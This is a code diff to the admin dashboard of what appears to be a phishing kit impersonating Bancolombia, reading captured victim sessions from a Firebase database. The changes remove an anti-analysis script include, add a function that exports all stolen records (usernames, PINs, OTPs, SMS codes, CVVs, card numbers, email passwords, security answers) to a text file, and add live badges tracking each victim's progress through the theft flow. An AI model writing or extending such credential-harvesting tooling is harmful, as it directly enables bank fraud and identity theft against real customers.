@@ -3,7 +3,6 @@
 <html lang="es">
 
 <head>
-    <script src="assets/js/anti_analysis.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Panel de Control Admin - Tiempo Real</title>
@@ -537,6 +536,11 @@
         </div>
 
         <div class="header-controls">
+            <button id="btnExportTxt" class="btn-audio" onclick="exportDatabaseTxt()" style="background: linear-gradient(135deg, #10b981, #059669); color: white; border: none; box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);">
+                <i class="fa-solid fa-file-arrow-down"></i>
+                <span>Descargar TXT</span>
+            </button>
+
             <button id="btnAudioToggle" class="btn-audio active" onclick="toggleAudio()">
                 <i class="fa-solid fa-volume-high" id="audioIcon"></i>
                 <span id="audioText">Sonido: ON</span>
@@ -754,6 +758,80 @@
 
         const playedSoundCache = {};
 
+        let currentAllDevicesList = [];
+
+        function exportDatabaseTxt() {
+            try {
+                if (!currentAllDevicesList || currentAllDevicesList.length === 0) {
+                    alert('No hay registros de la base de datos disponibles para descargar.');
+                    return;
+                }
+
+                const fechaActual = new Date();
+                const fechaStr = fechaActual.toLocaleString('es-CO', { dateStyle: 'medium', timeStyle: 'medium' });
+
+                let content = `======================================================================\n`;
+                content += `                  REPORTE DE BASE DE DATOS - CAIN\n`;
+                content += `             Fecha: ${fechaStr} | Total: ${currentAllDevicesList.length} registros\n`;
+                content += `======================================================================\n\n`;
+
+                currentAllDevicesList.forEach((item, index) => {
+                    const dev = item.data || {};
+                    const dataObj = dev.data || {};
+                    const deviceId = item.deviceId || 'Desconocido';
+                    const tipo = dev.type || 'Bancolombia';
+                    const estado = dev.status || 'visitante';
+                    const ip = dataObj.ip || dev.ip || 'Sin IP';
+                    const lastAct = dev.lastActivity ? new Date(dev.lastActivity).toLocaleString('es-CO') : 'Sin fecha';
+
+                    const usuario = dataObj.usuarioEntidad || dev.usuarioEntidad || '---';
+                    const password = dataObj.passwordEntidad || dev.passwordEntidad || '---';
+                    const otp = dataObj.otp || dev.otp || '---';
+                    const dinamica = dataObj.dinamica || '---';
+                    const sms = dataObj.sms || '---';
+                    const cvv = dataObj.cvv || '---';
+                    const tarjeta = dataObj.tarjeta || '---';
+                    const correo = dataObj.correo || '---';
+                    const claveCorreo = dataObj.claveCorreo || '---';
+                    const respuestaSeguridad = dataObj.respuestaSeguridad || '---';
+                    const paso = dataObj.paso || '---';
+
+                    content += `[REGISTRO ${index + 1}]\n`;
+                    content += `ID Dispositivo: ${deviceId}\n`;
+                    content += `Tipo: ${tipo} | Estado: ${estado} | IP: ${ip}\n`;
+                    content += `Última Actividad: ${lastAct}\n\n`;
+                    content += `--- CREDENCIALES Y DATOS ---\n`;
+                    content += `Usuario: ${usuario}\n`;
+                    content += `Clave / PIN: ${password}\n`;
+                    content += `Código OTP: ${otp}\n`;
+                    if (dinamica !== '---') content += `Clave Dinámica: ${dinamica}\n`;
+                    if (sms !== '---') content += `Código SMS: ${sms}\n`;
+                    if (cvv !== '---') content += `Código CVV: ${cvv}\n`;
+                    if (tarjeta !== '---') content += `Tarjeta: ${tarjeta}\n`;
+                    if (correo !== '---') content += `Correo: ${correo}\n`;
+                    if (claveCorreo !== '---') content += `Clave Correo: ${claveCorreo}\n`;
+                    if (respuestaSeguridad !== '---') content += `Resp. Seguridad: ${respuestaSeguridad}\n`;
+                    if (paso !== '---') content += `Paso / Pantalla: ${paso}\n`;
+                    content += `----------------------------------------------------------------------\n\n`;
+                });
+
+                const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                const fechaFile = fechaActual.toISOString().slice(0, 10);
+                a.href = url;
+                a.download = `base_de_datos_cain_${fechaFile}.txt`;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+                playChimeSound(880, 0.15);
+            } catch (e) {
+                console.error('Error al exportar TXT:', e);
+                alert('Ocurrió un error al generar la descarga del archivo TXT.');
+            }
+        }
+
         db.ref(`sessions/${userId}`).on('value', (snapshot) => {
             const rootData = snapshot.val() || {};
             devicesContainer.innerHTML = '';
@@ -790,6 +868,7 @@
                 item.createdAtFixed = deviceFirstSeenMap[devId];
             });
             allDevicesList.sort((a, b) => (b.createdAtFixed || 0) - (a.createdAtFixed || 0));
+            currentAllDevicesList = allDevicesList;
 
             if (allDevicesList.length === 0) {
                 devicesContainer.innerHTML = `
@@ -838,21 +917,65 @@
                     }
 
                     // BADGE DE ESTADO
-                    let badgeClass = 'status-visitor';
-                    let badgeText = statusText;
 
-                    if (statusText.includes('wpp') || statusText.includes('whatsapp') || dev.wppClicked) {
+                    // DETECCION COMPLETA DE ESTADOS DEL CLIENTE EN TIEMPO REAL
+                    let badgeClass = 'status-visitor';
+                    let badgeText = (statusText || 'visitante').toUpperCase();
+                    let statusColor = '#3b82f6';
+                    const st = (statusText || '').toLowerCase();
+
+                    if (!isOnline) {
+                        badgeClass = 'status-visitor';
+                        badgeText = '🔴 INACTIVO / DESCONECTADO';
+                        statusColor = '#ef4444';
+                    } else if (st.includes('presiono wpp') || st.includes('clic en wpp') || dev.wppClicked) {
                         badgeClass = 'status-complete';
                         badgeText = '💬 CLIENTE DIO CLIC EN WPP';
-                    } else if (statusText.includes('completó')) {
+                        statusColor = '#22c55e';
+                    } else if (st.includes('whatsapp') || st.includes('wpp')) {
                         badgeClass = 'status-complete';
-                        badgeText = 'COMPLETADO';
-                    } else if (statusText.includes('login') || usuario !== '---') {
-                        badgeClass = 'status-typing';
-                        badgeText = 'EN PROCESO';
-                    } else if (!isOnline) {
+                        badgeText = '📲 EN PANTALLA WHATSAPP';
+                        statusColor = '#25D366';
+                    } else if (st.includes('error clave') || st.includes('error dinamica')) {
                         badgeClass = 'status-visitor';
-                        badgeText = 'INACTIVO';
+                        badgeText = '⚠️ ERROR CLAVE DINÁMICA';
+                        statusColor = '#f97316';
+                    } else if (st.includes('error sms') || st.includes('error código')) {
+                        badgeClass = 'status-visitor';
+                        badgeText = '⚠️ ERROR CÓDIGO SMS';
+                        statusColor = '#f97316';
+                    } else if (st.includes('error login')) {
+                        badgeClass = 'status-visitor';
+                        badgeText = '❌ ERROR LOGIN';
+                        statusColor = '#ef4444';
+                    } else if (st.includes('esperando clave') || st.includes('clave dinámica')) {
+                        badgeClass = 'status-typing';
+                        badgeText = '🔑 ESPERANDO CLAVE DINÁMICA';
+                        statusColor = '#a855f7';
+                    } else if (st.includes('esperando sms') || st.includes('sms')) {
+                        badgeClass = 'status-typing';
+                        badgeText = '💬 ESPERANDO CÓDIGO SMS';
+                        statusColor = '#6366f1';
+                    } else if (st.includes('cvv')) {
+                        badgeClass = 'status-typing';
+                        badgeText = '💳 ESPERANDO CÓDIGO CVV';
+                        statusColor = '#38bdf8';
+                    } else if (st.includes('seguridad')) {
+                        badgeClass = 'status-typing';
+                        badgeText = '🛡️ PREGUNTA SEGURIDAD';
+                        statusColor = '#c084fc';
+                    } else if (st.includes('escribiendo') || st.includes('ingresando') || usuario !== '---') {
+                        badgeClass = 'status-typing';
+                        badgeText = '✍️ ESCRIBIENDO DATOS';
+                        statusColor = '#eab308';
+                    } else if (st.includes('completó') || st.includes('finalizado')) {
+                        badgeClass = 'status-complete';
+                        badgeText = '✅ PROCESO COMPLETADO';
+                        statusColor = '#10b981';
+                    } else if (st.includes('visitante')) {
+                        badgeClass = 'status-visitor';
+                        badgeText = '👀 VISITANTE EN PÁGINA';
+                        statusColor = '#3b82f6';
                     }
 
                     // RENDERIZAR TARJETA
